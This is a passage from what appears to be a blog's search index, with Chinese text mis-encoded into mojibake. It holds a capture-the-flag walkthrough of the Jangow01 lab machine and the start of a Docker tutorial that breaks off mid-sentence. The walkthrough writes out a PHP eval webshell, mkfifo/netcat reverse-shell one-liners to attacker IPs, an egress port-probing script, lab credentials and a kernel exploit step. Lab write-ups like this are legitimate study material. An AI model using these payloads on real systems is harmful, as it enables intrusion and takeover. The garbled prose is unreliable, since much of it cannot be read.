ä¸ºä½œè€…åœ¨é¶æœºé‡Œé¢é…ç½®çš„ç½‘å¡ä¸vmwareé‡Œé¢çš„ç½‘å¡é…ç½®ä¸å¤ªä¸€æ ·ï¼Œè¿™ä¼šå¯¼è‡´é¶æœºæ— æ³•æ­£å¸¸è”ç½‘ï¼Œäº§ç”ŸIPã€‚ä¸ºæ­¤å‚è€ƒäº†åšå®¢https://blog.csdn.net/qq_45722813/article/details/121324686å¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†è§£å†³ã€‚\nä¸‹é¢ç®€è¿°ä¸€ä¸‹æ“ä½œæµç¨‹ï¼Œè¿™é‡Œçš„é…å›¾ç›´æ¥å€Ÿç”¨åšå®¢çš„ï¼Œå°±ä¸åœ¨é‡å¤æˆªå›¾äº†ã€‚\nè¿›å…¥é…ç½®ç•Œé¢:å°†ro ä¿®æ”¹ä¸ºrw single init=/bin/bash ç„¶åctrl + x é‡å¯é¶æœºè¿›å…¥å•ç”¨æˆ·å‘½ä»¤è¡Œæ¨¡å¼ ç„¶åè¾“å…¥ipconfig -aæŸ¥çœ‹ç½‘å¡ï¼Œvmwareä¸‹çš„ç½‘å¡ä¸ºens33 vim /etc/network/interfacesç¼–è¾‘ç½‘ç»œé…ç½®æ–‡ä»¶ å°†enp0s3 ä¿®æ”¹ä¸ºens33å³å¯ dhclientè¿›è¡Œè‡ªåŠ¨åˆ†é…IPåœ°å€ å°½ç®¡è®¾ç½®å®Œæ¯•ï¼ŒIPå¯ä»¥æ­£å¸¸äº§ç”Ÿï¼Œä½†æ˜¯åœ¨ä½œè€…ä»‹ç»çš„é¶æœºå¼€å¯åå†REDEä¸€æ å‡ºç°çš„IPä»ç„¶æ— æ³•çœ‹åˆ°ï¼Œæ¨æµ‹è¿˜æ˜¯virtualBoxä¸Vmwareä¸€äº›é…ç½®ä¸å¤ªå…¼å®¹ï¼Œä½†æ˜¯ä¾›ç»™æˆ‘ä»¬æ­£å¸¸å®Œæˆè¿™ä¸ªæ¸—é€ç»ƒä¹ æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚\n0x01 ä¿¡æ¯æ”¶é›† æˆ‘ä»¬æŠŠé¶æœºå’Œæ”»å‡»æœºkaliéƒ½æ”¾åœ¨net8ç½‘å…³ä¸‹é¢ï¼Œæ‰€ä»¥é¶æœºå’Œæ”»å‡»æœºæ˜¯åœ¨åŒä¸€ä¸ªç½‘æ®µé‡Œé¢ï¼Œä¾¿äºå®è·µã€‚\né¶æœºIP ï¼š 192.168.204.128\næ‰«æä¸»æœº å‘½ä»¤nmap -sn 192.168.204.0/24 æ‰«æç½‘æ®µï¼Œè·å¾—é¶æœºip\n192.168.204.128ä¸ºæ”»å‡»æœºåœ°å€\n192.168.204.2ä¸ºnet8ç½‘æ®µçš„ç½‘å…³åœ°å€\næ‰€ä»¥192.168.204.129å®é™…ä¸Šå°±æ˜¯é¶æœºçš„åœ°å€\næ‰«æç«¯å£ masscan -p 0-65535 192.168.204.129 --rate=10000 æ¥æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£\nå‘ç°å¼€æ”¾äº†80å’Œ21ç«¯å£\næœåŠ¡æ¢æµ‹ nmap -sC -p 21,80 192.168.204.129è¿›è¡Œä¸€äº›æœåŠ¡æ¢æµ‹\nå‘ç°å…¶å¼€æ”¾äº†ftpå’ŒhttpæœåŠ¡ï¼Œå¹¶ä¸”åœ¨httpæœåŠ¡ä¸‹å­˜åœ¨ç«™ç‚¹site\nè®¿é—®site\n0x02 æ¼æ´æ”¶é›† ftpå¯èƒ½å­˜åœ¨å¼±å£ä»¤çˆ†ç ´ã€‚\nç„¶åhttp://192.168.204.129/site/busque.php?buscar=è¿™ä¸ªæ¥å£å‘ç°äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´,å¯ä»¥æ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚\nå¹¶ä¸”å‘ç°busque.phpå®é™…ä¸Šæ˜¯ä¸€ä¸ªåé—¨ï¼Œä¸€å¥è¯æœ¨é©¬ã€‚\n0x03 æ¼æ´åˆ©ç”¨ å› ä¸ºå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ‰€ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬:echo '\u0026lt;?php eval($_POST[\u0026quot;shell\u0026quot;]);' \u0026gt; shell.php\nå¯ä»¥çœ‹åˆ°ä¸Šä¼ æˆåŠŸ\nç„¶åç”¨èšå‰‘è¿æ¥ä¸€ä¸‹,è¿æ¥æˆåŠŸã€‚\næ•°æ®æ”¶é›† åœ¨/var/www/html/site/wordpress/config.phpç›®å½•ä¸‹é¢å‘ç°æ•°æ®åº“çš„username : desafio02å’Œpassword:abygurl69\nå¹¶ä¸”åœ¨/var/www/html/.backupä¸‹é¢è·å–åˆ°å¤‡ä»½æ–‡ä»¶ï¼Œä½†æ˜¯ä»–çš„usernameä¸ºjangow01\nå°è¯•äº†ä¹‹åï¼Œå‘ç°è´¦æˆ·jangow01å’Œå¯†ç abygurl69å®é™…ä¸Šå°±æ˜¯é¶æœºçš„ä¸€ä¸ªç”¨æˆ·,å¹¶ä¸”ä¹Ÿæ˜¯ftpçš„è´¦æˆ·a\nåœ¨/hone/jangow01ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªuser.txtï¼Œå°†å…¶md5è§£å¯†å‘ç°ä¸ºç©º\nç¨³å®šè¿æ¥ æˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellæ¥è·å¾—ç¨³å®šçš„è¿æ¥ã€‚\nåœ¨kali é€šè¿‡å‘½ä»¤nc -lvp 4444å¯¹4444ç«¯å£è¿›è¡Œç›‘å¬\né€šè¿‡èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯è¿›è¡Œåå¼¹shell\nçŒœæµ‹å¯èƒ½æ˜¯ç«¯å£å ç”¨ã€‚\nå¯ä»¥ç”¨ncæ¥æ¢æµ‹å“ªä¸ªç«¯å£å¯ç”¨\nåœ¨kaliä¸Šé¢æŠŠæ‰€æœ‰ç«¯å£0-65535å…¨éƒ¨ç»‘åˆ°æŸä¸ªç«¯å£:sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234\nç„¶åå†é¶æœºè¿è¡Œshellæ–‡ä»¶:/bin/bash nc.sh\n1 2 3 4 5 6 # !/bin/bash for i in {1..65535} do timeout 1 nc -vz 192.168.204.128 $i \u0026amp;\u0026amp; echo \u0026#34;$i open\u0026#34; \u0026gt;\u0026gt; out.txt || echo \u0026#34;$i closed\u0026#34; \u0026gt;\u0026gt; out.txt; done ç„¶åå‘ç°443ç«¯å£å¯ä»¥æ­£å¸¸è®¿é—®çš„ã€‚\näºæ˜¯ä¼ å…¥å¦‚ä¸‹çš„åå¼¹shellæœ¨é©¬\n1 \u0026lt;?php system(\u0026#34;rm tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.204.128 443 \u0026gt;/tmp/f\u0026#34;);?\u0026gt; ç„¶åè®¿é—®è¯¥æœ¨é©¬ï¼Œä»è€Œåå¼¹shellæˆåŠŸã€‚\nç„¶åè¾“å…¥python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'ç¾åŒ–ç»ˆç«¯\n0x04 æƒé™æå‡ ææƒçš„è¯ï¼Œè¿™é‡Œä¸»è¦ç”¨åˆ°å†…æ ¸æ–¹é¢çš„ææƒã€‚\nuname -aæŸ¥çœ‹é¶æœºç³»ç»Ÿä¿¡æ¯\nç‰ˆæœ¬ä¸º4.4.0-31-generic åˆ©ç”¨kaliä¸­çš„searchsploitæŸ¥æ‰¾å¯ç”¨äºææƒçš„è„šæœ¬:searchsploit ubuntu 4.4.0-31\nç„¶åå‘½ä»¤searchsploit -m linx/local/45010.c\nå°†å…¶ç¼–è¯‘åé€šè¿‡ftpå‘é€åˆ°é¶æœºã€‚\nç„¶åä¸ºexpæ·»åŠ æ‰§è¡Œæƒé™ï¼Œç„¶åå‘ç°www-dataæ²¡æœ‰è¿™ä¸ªæƒé™ã€‚\näºæ˜¯æƒ³åˆ°åˆ‡æ¢ç”¨æˆ·su jangow01ï¼Œç„¶åchmod a+x expï¼Œæ‰§è¡Œæˆ‘ä»¬çš„expè¿›è¡Œææƒã€‚\né€šè¿‡å‘½ä»¤idï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®ä¸ºrootæƒé™ï¼Œå¹¶ä¸”åœ¨rootç›®å½•ä¸‹é¢å‘ç°äº†ä¸€ä¸ªproof.txtæ–‡ä»¶ï¼Œå³ä¸ºæˆ‘ä»¬çš„flag\n0x05 æ”¶è· æ¢³ç†ä¸€ä¸‹åˆ©ç”¨çš„å…¨è¿‡ç¨‹:\né€šè¿‡ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´å†™å…¥ä¸€å¥è¯ï¼Œç„¶åä½¿ç”¨èšå‰‘è¿æ¥å¾—åˆ°webshellï¼Œä½†æ˜¯åœ¨åå¼¹shellå¾—æ—¶å€™ç¢°åˆ°äº†é—®é¢˜ï¼Œå°è¯•ä½¿ç”¨bashã€phpã€ncç­‰è¿›è¡Œåå¼¹éƒ½æ²¡æœ‰æˆåŠŸï¼Œå‘ç°åŸæ¥æ˜¯æœåŠ¡å™¨èƒ½å¤Ÿè®¿é—®çš„å¤–éƒ¨ç«¯å£å—åˆ°äº†é™åˆ¶ï¼Œæœ€åé€šè¿‡æ¢æµ‹å‘ç°åªèƒ½è®¿é—®å¤–éƒ¨çš„443ç«¯å£ï¼Œäºæ˜¯åœ¨kaliä½¿ç”¨ncç›‘å¬443ç«¯å£ï¼Œç„¶åé€šè¿‡è®¿é—®å¼è§¦å‘ncåå¼¹å‘½ä»¤æ‰æˆåŠŸã€‚ å¾—åˆ°åå¼¹çš„shellä¹‹åé€šè¿‡å¯»æ‰¾æ•æ„Ÿæ–‡ä»¶å¾—åˆ°äº†æ™®é€šç”¨æˆ·çš„è´¦æˆ·å¯†ç ï¼Œå¯ç”¨äºç”¨æˆ·åˆ‡æ¢ä»¥åŠftpç™»å½•ï¼Œæœ€åå°±æ˜¯é€šè¿‡æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼Œå¯»æ‰¾å¯¹åº”å¯ææƒçš„è„šæœ¬ï¼Œé€šè¿‡ftpä¸Šä¼ ï¼Œæœ€åè¿è¡Œææƒè„šæœ¬å¾—åˆ°rootæƒé™ã€‚ ç„¶åå­¦åˆ°äº†nc åå¼¹shellçš„ä¸€äº›å§¿åŠ¿:\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.146.129 2333 \u0026gt;/tmp/f mkfifo å‘½ä»¤é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œcat å°†ç®¡é“é‡Œé¢çš„å†…å®¹è¾“å‡ºä¼ é€’ç»™/bin/shï¼Œshä¼šæ‰§è¡Œç®¡é“é‡Œçš„å‘½ä»¤å¹¶å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºç»“æœé€šè¿‡nc ä¼ åˆ°è¯¥ç®¡é“ï¼Œç”±æ­¤å½¢æˆäº†ä¸€ä¸ªå›è·¯ ç±»ä¼¼çš„å‘½ä»¤:mknod backpipe p; nc 192.168.146.129 2333 0\u0026lt;backpipe | /bin/bash 1\u0026gt;backpipe 2\u0026gt;backpipe åŒæ—¶äº†è§£åˆ°äº†ä¸€äº›shellçš„ç¼–å†™å’Œå¯¹/bin/shã€/bin/bash\n0x06 Reference åå¼¹shellçš„æœ¬è´¨\nhttps://juejin.cn/post/7067095980922912799\nhttps://www.modb.pro/db/491885\n","permalink":"http://www.reus09.top/posts/tech/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-jangow01/","summary":"ä¹‹å‰åªæ˜¯äº†è§£è¿‡ä¸€äº›æ¸—é€å·¥å…·çš„ä½¿ç”¨è¿˜æœ‰ä¸€äº›æ¸—é€æ€è·¯ï¼Œè¿™æ¬¡é¶æœºjangow01çš„ç»ƒä¹ ç®—æ˜¯åšäº†ä¸€ä¸ªå°æ•´åˆã€‚ä½†å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡åšï¼Œéš¾å…æœ‰äº›æŸæ‰‹æ— ç­–ã€æ²¡æœ‰","title":"é¶æœºç»ƒä¹  Jangow01"},{"content":"è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æƒ³å¯¹dockerçš„å¸¸è§ä½¿ç”¨åšä¸€ä¸‹å°ç»“ï¼Œå¹¶å­¦ä¹ ä¸€ä¸‹dockerfileçš„ç¼–å†™æ–¹æ³•ã€‚\n0x01 dockerçš„åŸºæœ¬æ¶æ„ é¦–å…ˆæŸ¥çœ‹dockerå®˜ç½‘ç»™å‡ºçš„dockeræ¶æ„å›¾ï¼š\nåœ¨è¿è¡Œæ—¶åˆ†ä¸º Docker å¼•æ“ï¼ˆæœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼‰ å’Œ å®¢æˆ·ç«¯å·¥å…·ï¼Œæˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨å„ç§ docker å‘½ä»¤ï¼Œå…¶å®å°±æ˜¯åœ¨ä½¿ç”¨ å®¢æˆ·ç«¯å·¥å…· ä¸ Docker å¼•æ“ è¿›è¡Œäº¤äº’ã€‚\nImage é•œåƒ ç®€å•çš„ç†è§£ï¼ŒDocker é•œåƒå°±æ˜¯ä¸€ä¸ª Linux çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆRoot FileSystemï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé‡Œé¢åŒ…å«å¯ä»¥è¿è¡Œåœ¨ Linux å†…æ ¸çš„ç¨‹åºä»¥åŠç›¸åº”çš„æ•°æ®ã€‚\né€šè¿‡é•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªé•œåƒå°±æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„åŒ…ï¼Œå…¶ä¸­åŒ…æ‹¬è¿è¡Œåº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„æ‰€æœ‰å†…å®¹ï¼šåŒ…å«ä»£ç ï¼Œè¿è¡Œæ—¶é—´ï¼Œåº“ï¼Œç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ç­‰ã€‚\nDocker æŠŠ App æ–‡ä»¶æ‰“åŒ…æˆä¸ºä¸€ä¸ªé•œåƒï¼Œå¹¶ä¸”é‡‡ç”¨ç±»ä¼¼å¤šæ¬¡å¿«ç…§çš„å­˜å‚¨æŠ€æœ¯ï¼Œå¯ä»¥å®ç°ï¼š\nå¤šä¸ª App å¯ä»¥å…±ç”¨ç›¸åŒçš„åº•å±‚é•œåƒï¼ˆåˆå§‹çš„æ“ä½œç³»ç»Ÿé•œåƒï¼‰ï¼› App è¿è¡Œæ—¶çš„ IO æ“ä½œå’Œé•œåƒæ–‡ä»¶éš”ç¦»ï¼› é€šè¿‡æŒ‚è½½åŒ…å«ä¸åŒé…ç½®/æ•°æ®æ–‡ä»¶çš„ç›®å½•æˆ–è€…å·ï¼ˆVolumeï¼‰ï¼Œå•ä¸ª App é•œåƒå¯ä»¥ç”¨æ¥è¿è¡Œæ— æ•°ä¸ªä¸åŒä¸šåŠ¡çš„å®¹å™¨ã€‚ Container å®¹å™¨ é•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç±»å’Œå®ä¾‹ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚\nDocker é¢å‘å¯¹è±¡ å®¹å™¨ å¯¹è±¡ é•œåƒ ç±» é•œåƒåˆ†å±‚ ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæ–°é•œåƒæ˜¯ä» base é•œåƒä¸€å±‚ä¸€å±‚å åŠ ç”Ÿæˆçš„ã€‚æ¯å®‰è£…ä¸€ä¸ªè½¯ä»¶ï¼Œå°±åœ¨ç°æœ‰é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€å±‚ã€‚\né•œåƒåˆ†å±‚æœ€å¤§çš„ä¸€ä¸ªå¥½å¤„å°±æ˜¯å…±äº«èµ„æºã€‚æ¯”å¦‚è¯´æœ‰å¤šä¸ªé•œåƒéƒ½ä»ç›¸åŒçš„ base é•œåƒæ„å»ºè€Œæ¥ï¼Œé‚£ä¹ˆ Docker Host åªéœ€åœ¨ç£ç›˜ä¸Šä¿å­˜ä¸€ä»½ base é•œåƒï¼›åŒæ—¶å†…å­˜ä¸­ä¹Ÿåªéœ€åŠ è½½ä¸€ä»½ base é•œåƒï¼Œå°±å¯ä»¥ä¸ºæ‰€æœ‰å®¹å™¨æœåŠ¡äº†ã€‚è€Œä¸”é•œåƒçš„æ¯ä¸€å±‚éƒ½å¯ä»¥è¢«å…±äº«ã€‚\nå¦‚æœå¤šä¸ªå®¹å™¨å…±äº«ä¸€ä»½åŸºç¡€é•œåƒï¼Œå½“æŸä¸ªå®¹å™¨ä¿®æ”¹äº†åŸºç¡€é•œåƒçš„å†…å®¹ï¼Œæ¯”å¦‚ /etc ä¸‹çš„æ–‡ä»¶ï¼Œè¿™æ—¶å…¶ä»–å®¹å™¨çš„ /etc æ˜¯ä¸ä¼šè¢«ä¿®æ”¹çš„ï¼Œä¿®æ”¹åªä¼šè¢«é™åˆ¶åœ¨å•ä¸ªå®¹å™¨å†…ã€‚è¿™å°±æ˜¯å®¹å™¨ ã€ŒCopy-on-Writeã€ ç‰¹æ€§ã€‚\nç®€å•æ¥è¯´å°±æ˜¯é•œåƒæ˜¯ä¸€å±‚å¥—ä¸€å±‚çš„ï¼Œæ¯åŠ å…¥ä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œå°±ç›¸å½“äºæŠŠåŸæœ¬çš„å®¹å™¨ä½œä¸ºä¸€ä¸ªImage,åœ¨å…¶åŸºç¡€ä¸Šäº§ç”Ÿä¸€ä¸ªæ–°çš„Container,å¹¶ä¸”åªæœ‰å®¹å™¨å±‚æ˜¯å¯å†™çš„ï¼Œå…¶ä»–å±‚éƒ½æ˜¯åªè¯»çš„ã€‚\nåŸºæœ¬è¿‡ç¨‹ å¦‚å›¾æ‰€ç¤º\n0x02 dockerçš„å¸¸ç”¨å‘½ä»¤ é•œåƒ æœç´¢é•œåƒ:docker search xxx\næ‹‰å–é•œåƒ: docker pull é•œåƒä»“åº“/é•œåƒåç§°\nåˆ—å‡ºé•œåƒ:docker images\nåˆ é™¤é•œåƒ: docker rmi é•œåƒåç§°/é•œåƒID\næäº¤é•œåƒ:docker commit -m \u0026quot;Added nmap\u0026quot; -a \u0026quot;xxx\u0026quot; b70f3162e24e ubuntu/nmap\n-m æ¥æŒ‡å®šæäº¤çš„è¯´æ˜ä¿¡æ¯ï¼Œè·Ÿæˆ‘ä»¬ä½¿ç”¨çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ä¸€æ ·ï¼Œ-a å¯ä»¥æŒ‡å®šæ›´æ–°çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¹‹åæ˜¯ç”¨æ¥åˆ›å»ºé•œåƒçš„å®¹å™¨çš„IDï¼Œæœ€åæŒ‡å®šç›®æ ‡é•œåƒçš„ä»“åº“åå’Œ tag ä¿¡æ¯ã€‚ å®¹å™¨ åˆ›å»ºå®¹å™¨: docker run é•œåƒåç§° å‚æ•° -tä»£è¡¨ç»ˆç«¯ï¼Œ-iä»£è¡¨äº¤äº’å¼ï¼Œ æŸ¥çœ‹å½“å‰è¿è¡Œçš„æ‰€æœ‰å®¹å™¨:docekr ps -a å¼€å¯å®¹å™¨:docker start å®¹å™¨ID åœæ­¢å®¹å™¨: docker stop å®¹å™¨ID é‡å¯å®¹å™¨:docker restart å®¹å™¨ID åˆ é™¤å®¹å™¨:docker rm å®¹å™¨ID å®¹å™¨å‘½ä»¤äº¤äº’:docker exec -it å®¹å™¨ID /bin/bash 0x03 Dockerfileç¼–å†™ å› ä¸ºæ¼æ´å¤ç°ä¸­ç»å¸¸éœ€è¦æ­å»ºç¯å¢ƒï¼Œå¹¶ä¸”æœ‰æ—¶ä¹Ÿéœ€è¦å°†æ¼æ´çš„dockerfileåˆ†äº«ç»™åˆ«äººï¼Œå› æ­¤dockerfileç¼–å†™è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„\næˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªDockerfileä½¿ç”¨docker buildæ¥åˆ›å»ºä¸€ä¸ªé•œåƒã€‚\nä¾‹å­ æˆ‘ä»¬ä»¥åˆ›å»ºä¸€ä¸ªé…ç½®å¥½nmapå·¥å…·çš„dockerç¼–å†™ä¸ºä¾‹å­ï¼Œå­¦ä¹ ä¸€ä¸‹Dockerfileçš„ç¼–å†™æŠ€å·§\nDockerfile ä¸­æ¯ä¸€æ¡æŒ‡ä»¤éƒ½åˆ›å»ºé•œåƒçš„ä¸€å±‚ï¼Œä¾‹å¦‚ï¼š\n1 2 3 4 5 # I want to use nmap to scan~ FROM ubuntu:18.04 MAINTAINER reus09 \u0026lt;614768006@qq.com\u0026gt; RUN apt-get -qq update RUN apt-get -qqy install nmap Dockerfile åŸºæœ¬çš„è¯­æ³•æ˜¯ï¼š\nä½¿ç”¨ # æ¥æ³¨é‡Š FROM æŒ‡ä»¤å‘Šè¯‰ Docker ä½¿ç”¨å“ªä¸ªé•œåƒä½œä¸ºåŸºç¡€é•œåƒ MAINTAINER æ³¨æ˜ç»´æŠ¤è€…çš„ä¿¡æ¯ RUN å¼€å¤´çš„å‘½ä»¤ä¼šåœ¨åˆ›å»ºä¸­è¿è¡Œï¼Œæ¯”å¦‚å®‰è£…ä¸€ä¸ªè½¯ä»¶åŒ…ï¼Œåœ¨è¿™é‡Œä½¿ç”¨apt-getæ¥å®‰è£…äº†nmap åœ¨ç›®å½•ä¸‹docker build -t=\u0026quot;ubuntu/nmap\u0026quot; .å¼€å§‹ç”Ÿæˆé•œåƒã€‚\n-t æ·»åŠ tag,æŒ‡å®šæ–°é•œåƒçš„ç”¨æˆ·ä¿¡æ¯ .æ˜¯Dockerfileæ‰€åœ¨çš„è·¯å¾„ã€‚ æŒ‡çš„æ³¨æ„çš„æ˜¯Dockerfileç¼–å†™çš„é•œåƒä¸èƒ½è¶…è¿‡127å±‚ã€‚\nå‘½ä»¤ FROM æ ¼å¼ä¸ºFROM image æˆ–FROM image:tagï¼Œå¹¶ä¸”Dockerfileä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤å¿…é¡»æ˜¯FROMæŒ‡ä»¤ï¼Œä¸”åœ¨åŒä¸€ä¸ªDockerfileä¸­åˆ›å»ºå¤šä¸ªé•œåƒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ªFROMæŒ‡ä»¤ã€‚\nMAINTAINER æ ¼å¼ä¸ºMAINTAINER user_name user_emailï¼ŒæŒ‡å®šç»´æŠ¤è€…ä¿¡æ¯\nRUN æ ¼å¼ä¸ºRUN command æˆ– RUN [\u0026quot;EXECUTABLE\u0026quot;,\u0026quot;PARAM1\u0026quot;,\u0026quot;PARAM2\u0026quot;.....] å‰è€…åœ¨shellç»ˆç«¯ä¸­è¿è¡Œå‘½ä»¤ï¼Œ/bin/sh -c commandï¼Œä¾‹å¦‚ï¼š/bin/sh -c \u0026quot;echo hello\u0026quot; åè€…ä½¿ç”¨execæ‰§è¡Œï¼ŒæŒ‡å®šå…¶ä»–è¿è¡Œç»ˆç«¯ä½¿ç”¨RUN[\u0026quot;/bin/bash\u0026quot;,\u0026quot;-c\u0026quot;,\u0026quot;echo hello\u0026quot;] æ¯æ¡RUNæŒ‡ä»¤å°†å½“å‰çš„é•œåƒåŸºç¡€ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œå¹¶æäº¤ä¸ºæ–°çš„é•œåƒï¼Œå‘½ä»¤è¾ƒé•¿çš„æ—¶å€™å¯ä»¥ä½¿ç”¨\\æ¥æ¢è¡Œã€‚\nCMD æ”¯æŒä¸‰ç§æ ¼å¼ï¼š CMD [\u0026quot;executable\u0026quot;,\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;]ï¼Œä½¿ç”¨execæ‰§è¡Œï¼Œè¿™æ˜¯æ¨èçš„æ–¹å¼ã€‚ CMD command param1 param2 åœ¨/bin/shä¸­æ‰§è¡Œã€‚ CMD [\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;] æä¾›ç»™ENTERYPOINTçš„é»˜è®¤å‚æ•°ã€‚ CMDç”¨äºæŒ‡å®šå®¹å™¨å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯ä¸ªDockerfileåªèƒ½æœ‰ä¸€ä¸ªCMDå‘½ä»¤ï¼Œå¤šä¸ªCMDå‘½ä»¤åªæ‰§è¡Œæœ€åä¸€ä¸ªã€‚è‹¥å®¹å™¨å¯åŠ¨æ—¶æŒ‡å®šäº†è¿è¡Œçš„å‘½ä»¤ï¼Œåˆ™ä¼šè¦†ç›–æ‰CMDä¸­æŒ‡å®šçš„å‘½ä»¤ã€‚\nEXPOSE æ ¼å¼ä¸º EXPOSE port [port2,port3,\u0026hellip;]ï¼Œä¾‹å¦‚EXPOSE 80è¿™æ¡æŒ‡ä»¤å‘Šè¯‰DockeræœåŠ¡å™¨æš´éœ²80ç«¯å£ï¼Œä¾›å®¹å™¨å¤–éƒ¨è¿æ¥ä½¿ç”¨ã€‚ åœ¨å¯åŠ¨å®¹å™¨çš„ä½¿ç”¨ä½¿ç”¨-Pï¼ŒDockerä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£å’Œè½¬å‘æŒ‡å®šçš„ç«¯å£ï¼Œä½¿ç”¨-på¯ä»¥å…·ä½“æŒ‡å®šä½¿ç”¨å“ªä¸ªæœ¬åœ°çš„ç«¯å£æ¥æ˜ å°„å¯¹å¤–å¼€æ”¾çš„ç«¯å£ã€‚\nENV æ ¼å¼ä¸ºï¼šEVN key value ã€‚ç”¨äºæŒ‡å®šç¯å¢ƒå˜é‡ï¼Œè¿™äº›ç¯å¢ƒå˜é‡ï¼Œåç»­å¯ä»¥è¢«RUNæŒ‡ä»¤ä½¿ç”¨ï¼Œå®¹å™¨è¿è¡Œèµ·æ¥ä¹‹åï¼Œä¹Ÿå¯ä»¥åœ¨å®¹å™¨ä¸­è·å–è¿™äº›ç¯å¢ƒå˜é‡ã€‚ ä¾‹å¦‚ ENV word hello RUN echo $word\nADD æ ¼å¼ï¼šADD src dest è¯¥å‘½ä»¤å°†å¤åˆ¶æŒ‡å®šæœ¬åœ°srcç›®å½•ä¸­çš„æ–‡ä»¶åˆ°å®¹å™¨ä¸­çš„destä¸­ï¼ŒåŸè·¯å¾„å¯ä»¥æ˜¯æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªURLæˆ–ä¸€ä¸ªtaræ–‡ä»¶ï¼Œtaræ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹ä¸ºç›®å½•ã€‚\n(1)å¦‚æœæºè·¯å¾„æ˜¯ä¸ªæ–‡ä»¶ï¼Œä¸”ç›®æ ‡è·¯å¾„æ˜¯ä»¥ / ç»“å°¾ï¼Œ åˆ™dockerä¼šæŠŠç›®æ ‡è·¯å¾„å½“ä½œä¸€ä¸ªç›®å½•ï¼Œä¼šæŠŠæºæ–‡ä»¶æ‹·è´åˆ°è¯¥ç›®å½•ä¸‹ã€‚ å¦‚æœç›®æ ‡è·¯å¾„ä¸å­˜åœ¨ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºç›®æ ‡è·¯å¾„ã€‚ (2)å¦‚æœæºè·¯å¾„æ˜¯ä¸ªæ–‡ä»¶ï¼Œä¸”ç›®æ ‡è·¯å¾„æ˜¯ä¸æ˜¯ä»¥ / ç»“å°¾ï¼Œåˆ™dockerä¼šæŠŠç›®æ ‡è·¯å¾„å½“ä½œä¸€ä¸ªæ–‡ä»¶ã€‚ å¦‚æœç›®æ ‡è·¯å¾„ä¸å­˜åœ¨ï¼Œä¼šä»¥ç›®æ ‡è·¯å¾„ä¸ºååˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹åŒæºæ–‡ä»¶ï¼› å¦‚æœç›®æ ‡æ–‡ä»¶æ˜¯ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œä¼šç”¨æºæ–‡ä»¶è¦†ç›–å®ƒï¼Œå½“ç„¶åªæ˜¯å†…å®¹è¦†ç›–ï¼Œæ–‡ä»¶åè¿˜æ˜¯ç›®æ ‡æ–‡ä»¶åã€‚ å¦‚æœç›®æ ‡æ–‡ä»¶å®é™…æ˜¯ä¸ªå­˜åœ¨çš„ç›®å½•ï¼Œåˆ™ä¼šæºæ–‡ä»¶æ‹·è´åˆ°è¯¥ç›®å½•ä¸‹ã€‚ æ³¨æ„ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæœ€å¥½æ˜¾ç¤ºçš„ä»¥ / 